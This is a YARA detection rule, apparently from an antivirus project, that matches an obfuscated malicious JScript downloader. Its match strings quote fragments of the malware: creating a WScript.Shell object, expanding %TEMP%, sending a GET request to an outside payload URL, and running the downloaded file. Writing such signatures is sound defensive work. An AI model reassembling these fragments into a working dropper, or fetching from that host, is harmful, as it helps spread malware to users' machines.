rule sig_20160427_6fae82ec249e92f8e33cbed95e16e0dd {
  meta:
    description = "datamaliciousorder - file 20160427_6fae82ec249e92f8e33cbed95e16e0dd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "238d680d23f80cac7348f763df6709c5ee1172b099c14fee97553affaf6c41e1"

  strings:
    $s1  = "function ZlhuoFyoyf() {return JswzoFhtvh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"KnVHMyG" ascii
    $s2  = "function ZlhuoFyoyf() {return JswzoFhtvh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"KnVHMyG" ascii
    $s3  = "var JswzoFhtvh = function XbacvSrpyx() {return VtzeqOhqxj[LulcdTngtj](\"WScript\"+\".Shell\");}(), PreqfLkuzi = 11;" fullword ascii
    $s4  = "function LdntyBjcec(EptkcWoosx, ShozfDmhci){OmdtmDsalk = OmdtmDsalk * 1; return EptkcWoosx - ShozfDmhci;};" fullword ascii
    $s5  = "var VtzeqOhqxj = this[\"WScript\"];" fullword ascii
    $s6  = "function WotrwMqklo(){return JprxuOfotm + \"\";};" fullword ascii
    $s7  = "if (NvprzAezzm[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "NvprzAezzm[KhinuPycgm](\"G\" + \"ET\", \"http://ca-cargo.sk/asl9ks\", false);" fullword ascii
    $s9  = "function MgfdmDdtiw() {return ((UbesbSjosf == true) && (UbesbSjosf == XhrzkOhgjg)) ? 1 : OmdtmDsalk;};" fullword ascii
    $s10 = "function WtdarSpfiq(SjkwpQbkug){JswzoFhtvh[\"R\"+\"un\"](SjkwpQbkug, OmdtmDsalk, OmdtmDsalk);};" fullword ascii
    $s11 = "XhrzkOhgjg = true; " fullword ascii
    $s12 = "function PwvgpUnhju()" fullword ascii
    $s13 = "var JtafaUhshd = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "var UbesbSjosf = false;" fullword ascii
    $s15 = "UyedoAiznx = true;" fullword ascii
    $s16 = "var XhrzkOhgjg = false;" fullword ascii
    $s17 = "function IykonTfjdz(){return LulcdTngtj;};" fullword ascii
    $s18 = "UbesbSjosf = true; " fullword ascii
    $s19 = "return LdntyBjcec(OkmuqQovmy, UmfhfXgoqk);" fullword ascii
    $s20 = "function BzeefJsmgr(MfbpzOjysm) {var GlfayRrabg = (1, 2, 3, 4, 5, MfbpzOjysm); return GlfayRrabg;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}